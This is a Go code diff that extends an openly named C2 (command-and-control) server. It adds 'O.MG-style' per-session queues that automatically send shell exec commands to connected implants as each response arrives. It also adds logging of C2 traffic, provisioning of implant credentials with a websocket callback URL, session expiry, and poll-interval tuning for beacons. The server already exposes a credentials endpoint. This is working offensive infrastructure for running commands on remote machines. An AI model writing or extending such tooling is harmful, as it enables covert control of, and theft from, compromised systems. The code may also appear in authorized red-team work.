@@ -9,6 +9,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"io/ioutil"
 	"log"
 	"net"
 	"net/http"
@@ -60,6 +61,34 @@ var socksConnsMu sync.Mutex
 var sessionPlatform = make(map[string]string)
 var sessionPlatformMu sync.Mutex
 
+// Per-session command queue (O.MG-style: queue commands, auto-send next on response)
+var sessionCmdQueue = make(map[string][]string)
+var sessionCmdQueueMu sync.Mutex
+
+// C2 traffic log (append-only: command sent / response received)
+const c2TrafficLogFile = "c2_traffic.jsonl"
+var c2TrafficLogMutex sync.Mutex
+
+// Session config (poll/timing hints; optional for operators)
+type sessionConfigEntry struct {
+	PollSeconds int `json:"poll_seconds"`
+	FastSeconds int `json:"fast_seconds"`
+}
+var sessionConfig = make(map[string]sessionConfigEntry)
+var sessionConfigMu sync.Mutex
+
+// Provisioned devices (alias -> client_id, client_secret for pre-registration)
+const provisionsFile = "provisions.json"
+type provisionEntry struct {
+	Alias        string `json:"alias"`
+	ClientID     string `json:"client_id"`
+	ClientSecret string `json:"client_secret"`
+}
+var provisions []provisionEntry
+var provisionsMu sync.Mutex
+var sessionAlias = make(map[string]string) // sessionID -> alias (for provisioned clients)
+var sessionAliasMu sync.Mutex
+
 func main() {
 	config := LoadConfig()
 	if err := config.Save(); err != nil {
@@ -90,6 +119,13 @@ func main() {
 	http.HandleFunc("/op/creds", corsOp(handleOpCreds))
 	http.HandleFunc("/op/sessions/history", corsOp(handleOpSessionsHistory))
 	http.HandleFunc("/op/audit", corsOp(handleOpAudit))
+	http.HandleFunc("/op/c2log", corsOp(handleOpC2Log))
+	http.HandleFunc("/op/queue", corsOp(handleOpQueue))
+	http.HandleFunc("/op/queue/clear", corsOp(handleOpQueueClear))
+	http.HandleFunc("/op/provision", corsOp(handleOpProvision))
+	http.HandleFunc("/op/session_config", corsOp(handleOpSessionConfig))
+
+	loadProvisions()
 
 	if f, err := os.OpenFile("c2_audit.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644); err == nil {
 		auditLog = log.New(f, "", log.LstdFlags)
@@ -98,6 +134,9 @@ func main() {
 	}
 
 	go runResponsePrinter()
+	if config.SessionTTLSec > 0 {
+		go runSessionTTLChecker()
+	}
 	if isTTY(os.Stdin) {
 		go runOperator()
 	} else {
@@ -167,6 +206,39 @@ func runResponsePrinter() {
 			out = ev.Response.Error
 		}
 		fmt.Printf("\n[%s] %s: %s\n> ", ev.SessionID, ev.Response.CommandID, strings.TrimSpace(out))
+	}
+}
+
+func runSessionTTLChecker() {
+	ticker := time.NewTicker(30 * time.Second)
+	defer ticker.Stop()
+	for range ticker.C {
+		config := LoadConfig()
+		if config.SessionTTLSec <= 0 {
+			return
+		}
+		ttl := time.Duration(config.SessionTTLSec) * time.Second
+		clientsMutex.Lock()
+		var toClose []string
+		for id, c := range clients {
+			c.Mu.Lock()
+			last := c.LastCheckin
+			c.Mu.Unlock()
+			if time.Since(last) > ttl {
+				toClose = append(toClose, id)
+			}
+		}
+		clientsMutex.Unlock()
+		for _, id := range toClose {
+			clientsMutex.Lock()
+			c := clients[id]
+			clientsMutex.Unlock()
+			if c != nil {
+				c.Mu.Lock()
+				c.Conn.Close()
+				c.Mu.Unlock()
+			}
+		}
 	}
 }
 
@@ -279,12 +351,31 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request) {
 	}
 
 	config := LoadConfig()
-	if auth.ClientID != config.ClientID || auth.ClientSecret != config.ClientSecret {
+	loadProvisions()
+	accepted := auth.ClientID == config.ClientID && auth.ClientSecret == config.ClientSecret
+	if !accepted {
+		for _, p := range provisions {
+			if p.ClientID == auth.ClientID && p.ClientSecret == auth.ClientSecret {
+				accepted = true
+				break
+			}
+		}
+	}
+	if !accepted {
 		log.Printf("Invalid client credentials")
 		return
 	}
 
 	sessionID := shortSessionID()
+	// Set alias for provisioned clients
+	for _, p := range provisions {
+		if p.ClientID == auth.ClientID && p.ClientSecret == auth.ClientSecret {
+			sessionAliasMu.Lock()
+			sessionAlias[sessionID] = p.Alias
+			sessionAliasMu.Unlock()
+			break
+		}
+	}
 	client := &common.Client{
 		ID:           sessionID,
 		Conn:         conn,
@@ -311,6 +402,15 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request) {
 		sessionPlatformMu.Lock()
 		delete(sessionPlatform, sessionID)
 		sessionPlatformMu.Unlock()
+		sessionAliasMu.Lock()
+		delete(sessionAlias, sessionID)
+		sessionAliasMu.Unlock()
+		sessionCmdQueueMu.Lock()
+		delete(sessionCmdQueue, sessionID)
+		sessionCmdQueueMu.Unlock()
+		sessionConfigMu.Lock()
+		delete(sessionConfig, sessionID)
+		sessionConfigMu.Unlock()
 	}()
 
 	log.Printf("session %s connected", sessionID)
@@ -321,6 +421,12 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request) {
 			log.Printf("Session %s closed: %v", sessionID, err)
 			return
 		}
+		clientsMutex.Lock()
+		if c, ok := clients[sessionID]; ok {
+			c.LastCheckin = time.Now()
+		}
+		clientsMutex.Unlock()
+
 		var raw map[string]interface{}
 		if err := json.Unmarshal(message, &raw); err != nil {
 			continue
@@ -344,6 +450,23 @@ func handleWebSocket(w http.ResponseWriter, r *http.Request) {
 			continue
 		}
 		ev := responseEvent{SessionID: sessionID, Response: resp}
+		detail := resp.Output
+		if resp.Error != "" {
+			detail = resp.Error
+		}
+		appendC2TrafficLog(sessionID, "in", detail)
+		// If session has queued commands, send next (no waiter)
+		sessionCmdQueueMu.Lock()
+		q := sessionCmdQueue[sessionID]
+		if len(q) > 0 {
+			nextCmd := q[0]
+			sessionCmdQueue[sessionID] = q[1:]
+			sessionCmdQueueMu.Unlock()
+			opSendNoWait(sessionID, nextCmd)
+		} else {
+			sessionCmdQueueMu.Unlock()
+		}
+
 		select {
 		case responseChan <- ev:
 		default:
@@ -589,6 +712,48 @@ func appendSessionEvent(event, id, addr string) {
 	appendSessionEventWithPlatform(event, id, addr, "")
 }
 
+func appendC2TrafficLog(sessionID, direction, detail string) {
+	c2TrafficLogMutex.Lock()
+	defer c2TrafficLogMutex.Unlock()
+	f, err := os.OpenFile(c2TrafficLogFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
+	if err != nil {
+		return
+	}
+	defer f.Close()
+	line, _ := json.Marshal(map[string]string{
+		"ts":         time.Now().UTC().Format(time.RFC3339),
+		"session_id": sessionID,
+		"direction":  direction,
+		"detail":     detail,
+	})
+	line = append(line, '\n')
+	f.Write(line)
+}
+
+func loadProvisions() {
+	provisionsMu.Lock()
+	defer provisionsMu.Unlock()
+	data, err := ioutil.ReadFile(provisionsFile)
+	if err != nil {
+		provisions = nil
+		return
+	}
+	json.Unmarshal(data, &provisions)
+	if provisions == nil {
+		provisions = []provisionEntry{}
+	}
+}
+
+func saveProvisions() error {
+	provisionsMu.Lock()
+	defer provisionsMu.Unlock()
+	data, err := json.MarshalIndent(provisions, "", "  ")
+	if err != nil {
+		return err
+	}
+	return ioutil.WriteFile(provisionsFile, data, 0644)
+}
+
 func appendSessionEventWithPlatform(event, id, addr, platform string) {
 	sessionLogMutex.Lock()
 	defer sessionLogMutex.Unlock()
@@ -628,14 +793,18 @@ func handleOpSessions(w http.ResponseWriter, r *http.Request) {
 		ID       string `json:"id"`
 		Addr     string `json:"addr"`
 		Platform string `json:"platform,omitempty"`
+		Alias    string `json:"alias,omitempty"`
 	}
 	var list []sessionInfo
 	clientsMutex.Lock()
 	sessionPlatformMu.Lock()
+	sessionAliasMu.Lock()
 	for id, c := range clients {
 		plat := sessionPlatform[id]
-		list = append(list, sessionInfo{ID: id, Addr: c.Conn.RemoteAddr().String(), Platform: plat})
+		alias := sessionAlias[id]
+		list = append(list, sessionInfo{ID: id, Addr: c.Conn.RemoteAddr().String(), Platform: plat, Alias: alias})
 	}
+	sessionAliasMu.Unlock()
 	sessionPlatformMu.Unlock()
 	clientsMutex.Unlock()
 	w.Header().Set("Content-Type", "application/json")
@@ -795,6 +964,222 @@ func handleOpSessionsHistory(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(list)
 }
 
+func handleOpC2Log(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	sessionID := r.URL.Query().Get("session_id")
+	limit := 200
+	if s := r.URL.Query().Get("limit"); s != "" {
+		if n, _ := fmt.Sscanf(s, "%d", &limit); n == 1 && limit > 0 && limit <= 1000 {
+			// use limit
+		}
+	}
+	abridge := r.URL.Query().Get("abridge") == "1" || r.URL.Query().Get("abridge") == "true"
+	f, err := os.Open(c2TrafficLogFile)
+	if err != nil {
+		if os.IsNotExist(err) {
+			w.Header().Set("Content-Type", "application/json")
+			json.NewEncoder(w).Encode([]interface{}{})
+			return
+		}
+		http.Error(w, "failed to read c2 log", http.StatusInternalServerError)
+		return
+	}
+	defer f.Close()
+	var lines []map[string]string
+	scanner := bufio.NewScanner(f)
+	for scanner.Scan() {
+		var m map[string]string
+		if json.Unmarshal(scanner.Bytes(), &m) != nil {
+			continue
+		}
+		if sessionID != "" && m["session_id"] != sessionID {
+			continue
+		}
+		if abridge && m["direction"] == "out" {
+			continue
+		}
+		lines = append(lines, m)
+	}
+	if len(lines) > limit {
+		lines = lines[len(lines)-limit:]
+	}
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(lines)
+}
+
+func handleOpQueue(w http.ResponseWriter, r *http.Request) {
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	switch r.Method {
+	case http.MethodGet:
+		sessionID := r.URL.Query().Get("session_id")
+		if sessionID == "" {
+			http.Error(w, "bad request: need session_id", http.StatusBadRequest)
+			return
+		}
+		sessionCmdQueueMu.Lock()
+		q := append([]string(nil), sessionCmdQueue[sessionID]...)
+		sessionCmdQueueMu.Unlock()
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{"session_id": sessionID, "queue": q})
+	case http.MethodPost:
+		var req struct {
+			SessionID string `json:"session_id"`
+			Command   string `json:"command"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" || req.Command == "" {
+			http.Error(w, "bad request: need session_id and command", http.StatusBadRequest)
+			return
+		}
+		clientsMutex.Lock()
+		_, ok := clients[req.SessionID]
+		clientsMutex.Unlock()
+		if !ok {
+			http.Error(w, "session not found", http.StatusNotFound)
+			return
+		}
+		sessionCmdQueueMu.Lock()
+		sessionCmdQueue[req.SessionID] = append(sessionCmdQueue[req.SessionID], req.Command)
+		sessionCmdQueueMu.Unlock()
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]string{"status": "ok", "session_id": req.SessionID})
+	default:
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+	}
+}
+
+func handleOpQueueClear(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	var req struct {
+		SessionID string `json:"session_id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
+		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
+		return
+	}
+	sessionCmdQueueMu.Lock()
+	delete(sessionCmdQueue, req.SessionID)
+	sessionCmdQueueMu.Unlock()
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{"status": "ok", "session_id": req.SessionID})
+}
+
+func handleOpProvision(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	var req struct {
+		Alias string `json:"alias"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Alias == "" {
+		http.Error(w, "bad request: need alias", http.StatusBadRequest)
+		return
+	}
+	loadProvisions()
+	provisionsMu.Lock()
+	for _, p := range provisions {
+		if p.Alias == req.Alias {
+			provisionsMu.Unlock()
+			http.Error(w, "alias already exists", http.StatusConflict)
+			return
+		}
+	}
+	clientID := shortSessionID() + shortSessionID()
+	clientSecret := shortSessionID() + shortSessionID()
+	provisions = append(provisions, provisionEntry{Alias: req.Alias, ClientID: clientID, ClientSecret: clientSecret})
+	provisionsMu.Unlock()
+	if err := saveProvisions(); err != nil {
+		http.Error(w, "failed to save provisions", http.StatusInternalServerError)
+		return
+	}
+	config := LoadConfig()
+	hostPort := fmt.Sprintf("https://localhost:%d", config.Port)
+	if config.Listeners != nil && len(config.Listeners) > 0 {
+		hostPort = fmt.Sprintf("https://HOST:%d", config.Listeners[0].Port)
+	}
+	provisionStr := fmt.Sprintf("client_id=%s client_secret=%s server_url=wss://HOST:PORT/live (set HOST and PORT to your server; e.g. wss://yourhost:%d/live)", clientID, clientSecret, config.Port)
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]string{
+		"alias":          req.Alias,
+		"client_id":      clientID,
+		"client_secret":  clientSecret,
+		"provision_str":  provisionStr,
+		"server_url_hint": hostPort,
+	})
+}
+
+func handleOpSessionConfig(w http.ResponseWriter, r *http.Request) {
+	if !checkOpToken(r) {
+		http.Error(w, "unauthorized", http.StatusUnauthorized)
+		return
+	}
+	sessionID := r.URL.Query().Get("session_id")
+	if sessionID == "" {
+		http.Error(w, "bad request: need session_id", http.StatusBadRequest)
+		return
+	}
+	switch r.Method {
+	case http.MethodGet:
+		sessionConfigMu.Lock()
+		cfg := sessionConfig[sessionID]
+		sessionConfigMu.Unlock()
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]interface{}{
+			"session_id":   sessionID,
+			"poll_seconds": cfg.PollSeconds,
+			"fast_seconds": cfg.FastSeconds,
+		})
+	case http.MethodPost:
+		var req struct {
+			SessionID   string `json:"session_id"`
+			PollSeconds int    `json:"poll_seconds"`
+			FastSeconds int    `json:"fast_seconds"`
+		}
+		if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionID == "" {
+			http.Error(w, "bad request: need session_id", http.StatusBadRequest)
+			return
+		}
+		sessionConfigMu.Lock()
+		if sessionConfig[req.SessionID].PollSeconds == 0 && sessionConfig[req.SessionID].FastSeconds == 0 {
+			sessionConfig[req.SessionID] = sessionConfigEntry{PollSeconds: 60, FastSeconds: 5}
+		}
+		ent := sessionConfig[req.SessionID]
+		if req.PollSeconds > 0 {
+			ent.PollSeconds = req.PollSeconds
+		}
+		if req.FastSeconds > 0 {
+			ent.FastSeconds = req.FastSeconds
+		}
+		sessionConfig[req.SessionID] = ent
+		sessionConfigMu.Unlock()
+		w.Header().Set("Content-Type", "application/json")
+		json.NewEncoder(w).Encode(map[string]string{"status": "ok", "session_id": req.SessionID})
+	default:
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+	}
+}
+
 func handleOpExec(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
@@ -914,6 +1299,29 @@ func handleOpKill(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(map[string]string{"status": "ok", "session_id": req.SessionID})
 }
 
+// opSendNoWait sends an exec command to the session without waiting for response (used for queue).
+func opSendNoWait(sessionID, command string) {
+	clientsMutex.Lock()
+	c, ok := clients[sessionID]
+	clientsMutex.Unlock()
+	if !ok {
+		return
+	}
+	cmdID := shortSessionID()
+	cm := common.Command{
+		Type: common.CmdExec,
+		ID:   cmdID,
+		Args: map[string]string{"command": command},
+	}
+	c.Mu.Lock()
+	err := c.Conn.WriteJSON(cm)
+	c.Mu.Unlock()
+	if err != nil {
+		return
+	}
+	appendC2TrafficLog(sessionID, "out", command)
+}
+
 func opSendAndWait(sessionID string, cm common.Command) (ev responseEvent, ok bool) {
 	clientsMutex.Lock()
 	c, ok := clients[sessionID]
@@ -923,6 +1331,9 @@ func opSendAndWait(sessionID string, cm common.Command) (ev responseEvent, ok bo
 	}
 	cmdID := shortSessionID()
 	cm.ID = cmdID
+	if cm.Type == common.CmdExec && cm.Args["command"] != "" {
+		appendC2TrafficLog(sessionID, "out", cm.Args["command"])
+	}
 	ch := make(chan responseEvent, 1)
 	pendingMutex.Lock()
 	pendingResponses[cmdID] = ch
